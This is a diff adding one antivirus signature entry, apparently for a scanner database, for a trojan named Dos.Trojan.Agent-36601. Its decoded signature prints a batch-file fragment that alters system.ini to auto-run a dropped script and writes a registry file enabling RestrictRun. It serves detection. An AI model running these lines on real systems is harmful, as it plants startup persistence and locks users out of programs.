@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36601
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off copy|echo [boot]>>%windir%\system.ini copy|echo 2.bat>>%windir%\system.ini echo @echo off>%windir%\2.bat copy|echo start %windir%\rs.reg>>%windir%\2.bat echo hkey_current_user\software\microsoft\windows\currentversion\polcies\restrictrun>%windir%\rs.reg copy|echo dword=00000001>>%windir%\rs.reg 
